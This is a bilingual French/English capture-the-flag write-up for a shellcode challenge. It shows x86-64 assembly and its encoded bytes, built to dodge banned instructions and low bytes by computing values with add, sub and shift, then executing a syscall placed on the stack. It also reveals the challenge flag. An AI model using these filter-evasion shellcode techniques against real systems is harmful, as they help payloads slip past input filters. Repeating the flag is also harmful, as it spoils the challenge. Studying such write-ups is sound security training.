# Shellcode Obfuscation 3
## Write-up
### Solution (Français)
Les restrictions ici nous interdisent d'utilise les instructions `mov` et `xor` ainsi que tout entre \x00 et \x0f. On doit donc trouver une façon de les substituer avant de faire notre syscall.

On peut faire des opérations comme des additions et soustractions pour arriver a notre fin. On peut aussi utiliser des opérations de bitshift. 

Voici a quoi peut ressembler le code pour faire ça:
``` assembly
BITS 64 
sub rcx,rcx
add ecx, 0x736567e8
shl rcx,0x20
add rcx, 0x6e614d00 + 0x11111111
sub rcx, 0x11111111
push rcx
push rcx
sub rdi,rdi
inc rdi
push 0x111111b8
pop rdx
sub rdx, 0x111111b0
lea rsi, [rsp]
sub rax,rax
inc rax

push 0x050f + 0x1111b0b0
pop rcx
sub rcx, 0x1111b0b0
push rcx
jmp rsp
```

Payload: `\x48\x29\xc9\x81\xc1\xe8\x67\x65\x73\x48\xc1\xe1\x20\x48\x81\xc1\x11\x5e\x72\x7f\x48\x81\xe9\x11\x11\x11\x11\x51\x51\x48\x29\xff\x48\xff\xc7\x68\xb8\x11\x11\x11\x5a\x48\x81\xea\xb0\x11\x11\x11\x48\x8d\x34\x24\x48\x29\xc0\x48\xff\xc0\x68\xbf\xb5\x11\x11\x59\x48\x81\xe9\xb0\xb0\x11\x11\x51\xff\xe4`

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`

### Solution (English)
The restrictions here forbid us to use the `mov` and `xor` instructions as well as anything between \x00 and \x0f. We must therefore find a way to substitute them before making our syscall.

We can do operations like additions and subtractions to get to our goal. We can also use bitshift operations.

Here is what the code might look like to do this:
``` assembly
BITS 64 
sub rcx,rcx
add ecx, 0x736567e8
shl rcx,0x20
add rcx, 0x6e614d00 + 0x11111111
sub rcx, 0x11111111
push rcx
push rcx
sub rdi,rdi
inc rdi
push 0x111111b8
pop rdx
sub rdx, 0x111111b0
lea rsi, [rsp]
sub rax,rax
inc rax

push 0x050f + 0x1111b0b0
pop rcx
sub rcx, 0x1111b0b0
push rcx
jmp rsp
```

Payload: `\x48\x29\xc9\x81\xc1\xe8\x67\x65\x73\x48\xc1\xe1\x20\x48\x81\xc1\x11\x5e\x72\x7f\x48\x81\xe9\x11\x11\x11\x11\x51\x51\x48\x29\xff\x48\xff\xc7\x68\xb8\x11\x11\x11\x5a\x48\x81\xea\xb0\x11\x11\x11\x48\x8d\x34\x24\x48\x29\xc0\x48\xff\xc0\x68\xbf\xb5\x11\x11\x59\x48\x81\xe9\xb0\xb0\x11\x11\x51\xff\xe4`

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`